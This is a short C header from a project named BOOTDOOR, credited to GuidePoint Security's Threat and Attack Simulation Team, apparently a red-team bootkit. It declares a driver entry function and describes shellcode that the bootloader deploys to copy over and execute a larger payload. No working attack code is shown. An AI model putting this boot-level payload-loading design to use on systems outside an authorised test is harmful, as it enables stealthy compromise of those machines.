/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Shellcode deployed by the bootloader
 * to copy over a larger payload for
 * execution.
 *
!*/
D_SEC( B ) NTSTATUS NTAPI DrvMain( PVOID DriverObject, PVOID RegistryPath );
